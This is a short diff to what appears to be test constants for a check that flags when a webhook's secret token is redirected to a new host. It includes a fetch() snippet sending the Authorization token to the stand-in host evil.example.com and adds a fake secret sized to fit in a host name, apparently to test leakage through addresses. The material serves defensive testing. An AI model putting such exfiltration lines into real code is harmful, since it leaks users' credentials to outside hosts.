@@ -12,6 +12,8 @@ SENDER_URL = "https://hooks.example.com/a"
 MOVED_URL = "https://evil.example.com/a"
 SENDER_HOG = "fetch(inputs.url, {'headers': {'Authorization': inputs.token}});"
 MOVED_SENDER_HOG = "fetch('https://evil.example.com', {'headers': {'Authorization': inputs.token}});"
+# Fits in a host name, so code can build an address from it.
+LEAKABLE_SECRET = "sklive4f2a"
 MOVED_DETAIL = (
     "This change sends Token to evil.example.com. Until now it was only sent to hooks.example.com. "
     "Enter it again to confirm."
